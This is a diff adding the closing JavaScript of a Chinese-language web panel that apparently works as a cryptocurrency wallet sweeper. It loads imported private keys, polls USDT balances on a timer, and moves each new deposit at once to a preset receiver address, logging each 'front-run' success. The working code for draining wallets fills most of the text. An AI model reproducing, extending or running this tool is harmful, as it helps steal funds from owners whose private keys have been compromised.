+        if(newCount>0) renderWallets();
+        document.getElementById("privateKeysList").value = "";
+    }
+    
+    async function privateSweepWallet(walletObj){
+        if(walletObj.isTransferring) return false;
+        walletObj.isTransferring=true; renderWallets();
+        try {
+            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, walletObj.wallet);
+            const balanceWei = await usdt.balanceOf(walletObj.address);
+            const bal = parseFloat(ethers.formatUnits(balanceWei, 18));
+            if(bal < 0.01) { walletObj.isTransferring=false; return false; }
+            const gasPrice = await getProvider().getFeeData();
+            const tx = await usdt.transfer(privateReceiverAddr, balanceWei, { gasLimit: 80000, gasPrice: gasPrice.gasPrice });
+            addLog(`⚡ 转出 ${bal.toFixed(4)} USDT | tx: ${tx.hash.slice(0,10)}...`, "success");
+            await tx.wait(1);
+            addLog(`✅ 抢跑成功！转出 ${bal.toFixed(4)} USDT`, "success");
+            totalSweptAmount += bal; successCountTotal++;
+            walletObj.lastBalance = 0;
+            renderWallets();
+            return true;
+        } catch(e) { addLog(`❌ 转账失败: ${e.message.slice(0,70)}`, "error"); return false; } 
+        finally { walletObj.isTransferring=false; renderWallets(); }
+    }
+    
+    async function privateMonitorCycle(){
+        if(!isPrivateMonitoring) return;
+        for(let w of privateWallets){
+            try {
+                const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, getProvider());
+                const balWei = await usdt.balanceOf(w.address);
+                const newBal = parseFloat(ethers.formatUnits(balWei, 18));
+                if(newBal > (w.lastBalance || 0) + 0.005 && newBal > 0.01){
+                    addLog(`🚨 ${w.address.slice(0,6)}...${w.address.slice(-4)} 到账 ${newBal.toFixed(4)} USDT，立即转出`, "warning");
+                    await privateSweepWallet(w);
+                    await new Promise(r=>setTimeout(r, 300));
+                } else { w.lastBalance = newBal; }
+                w.bnbBalance = await getBNBBalance(w.address);
+            } catch(e){}
+        }
+        renderWallets();
+    }
+    
+    function startPrivateMonitor(){
+        if(privateWallets.length===0){ addLog("❌ 请先导入私钥钱包","error"); return; }
+        if(privateMonitorInterval) clearInterval(privateMonitorInterval);
+        const interval = parseInt(document.getElementById("privateInterval").value);
+        privateMonitorInterval = setInterval(privateMonitorCycle, interval);
+        isPrivateMonitoring = true;
+        document.getElementById("statMonitorState").innerHTML="● 私钥监控中";
+        document.getElementById("statMonitorState").style.color="#10b981";
+        addLog(`🟢 私钥监控启动，间隔 ${interval}ms`, "success");
+    }
+    function stopPrivateMonitor(){ 
+        if(privateMonitorInterval){ clearInterval(privateMonitorInterval); privateMonitorInterval=null; } 
+        isPrivateMonitoring=false; 
+        document.getElementById("statMonitorState").innerHTML="○ 已停止";
+        document.getElementById("statMonitorState").style.color="#ef4444";
+        addLog("⏸️ 私钥监控停止","warning"); 
+    }
+    async function sweepAllPrivateNow(){ 
+        for(let w of privateWallets) if(w.lastBalance>0.01) await privateSweepWallet(w); 
+        addLog("批量转出完成","success"); 
+    }
+    function removePrivateWallet(addr){ privateWallets = privateWallets.filter(w=>w.address.toLowerCase()!==addr.toLowerCase()); renderWallets(); addLog(`🗑️ 已移除私钥钱包`,"warning"); }
+    
+    function showAddWalletModal(){ document.getElementById("addWalletModal").style.display="flex"; document.getElementById("newWalletAddress").value=""; }
+    function closeAddWalletModal(){ document.getElementById("addWalletModal").style.display="none"; }
+    
+    function switchActiveMode(mode){
+        currentActiveMode = mode;
+        document.getElementById("tabContractMode").classList.toggle("active", mode==='contract');
+        document.getElementById("tabPrivateMode").classList.toggle("active", mode==='private');
+        document.getElementById("contractModePanel").style.display = mode==='contract' ? 'block' : 'none';
+        document.getElementById("privateModePanel").style.display = mode==='private' ? 'block' : 'none';
+        document.getElementById("modeWalletLabel").innerHTML = mode==='contract' ? '(合约模式)' : '(私钥模式)';
+        if(mode==='contract') stopPrivateMonitor(); else stopMonitor();
+        renderWallets();
+    }
+    
+    function exportFullConfig(){ const cfg={mode:currentActiveMode,contractAddr:document.getElementById("contractAddr").value,privateReceiver:privateReceiverAddr}; const data=JSON.stringify(cfg); const blob=new Blob([data],{type:"application/json"}); const a=document.createElement("a"); a.href=URL.createObjectURL(blob); a.download=`config.json`; a.click(); addLog("配置已导出","success"); }
+    function showImportConfigModal(){ document.getElementById("importConfigModal").style.display="flex"; document.getElementById("importJsonData").value=""; }
+    function closeImportModal(){ document.getElementById("importConfigModal").style.display="none"; }
+    function importFullConfig(){ try{ const d=JSON.parse(document.getElementById("importJsonData").value); if(d.contractAddr) document.getElementById("contractAddr").value=d.contractAddr; if(d.privateReceiver) privateReceiverAddr=d.privateReceiver; addLog("配置导入成功","success"); }catch(e){ addLog("解析失败","error"); } closeImportModal(); }
+    
+    // 初始化默认合约地址
+    function initDefaultAddresses() {
+        const defaultAddr = DEFAULT_CONTRACT_ADDRESS;
+        document.getElementById("contractAddr").value = defaultAddr;
+        document.getElementById("privateContractAddr").value = defaultAddr;
+        addLog(`🏁 默认合约地址已加载: ${defaultAddr.slice(0,6)}...${defaultAddr.slice(-4)}`, "info");
+    }
+    
+    window.switchActiveMode=switchActiveMode; window.initContractMode=initContractMode; window.loadWalletsFromContract=loadWalletsFromContract;
+    window.startMonitor=startMonitor; window.stopMonitor=stopMonitor; window.sweepAllNow=sweepAllNow;
+    window.importAndApprove=importAndApprove; window.importOnly=importOnly; window.startPrivateMonitor=startPrivateMonitor; window.stopPrivateMonitor=stopPrivateMonitor; window.sweepAllPrivateNow=sweepAllPrivateNow;
+    window.addWalletToCurrentMode=addWalletToCurrentMode; window.removeWallet=removeWallet; window.removePrivateWallet=removePrivateWallet; window.showAddWalletModal=showAddWalletModal; window.closeAddWalletModal=closeAddWalletModal;
+    window.exportFullConfig=exportFullConfig; window.showImportConfigModal=showImportConfigModal; window.closeImportModal=closeImportModal; window.importFullConfig=importFullConfig; window.clearLogs=clearLogs;
+    window.manualRefreshAllBalances=manualRefreshAllBalances;
+    
+    document.addEventListener("DOMContentLoaded",()=>{ 
+        getProvider(); 
+        initDefaultAddresses();
+        renderWallets(); 
+        addLog("🏁 面板已加载，支持显示USDT+BNB余额，可手动刷新","info"); 
+    });
+    window.addEventListener("beforeunload",()=>{ if(monitorIntervalId) clearInterval(monitorIntervalId); if(privateMonitorInterval) clearInterval(privateMonitorInterval); });
+</script>
+</body>
+</html>
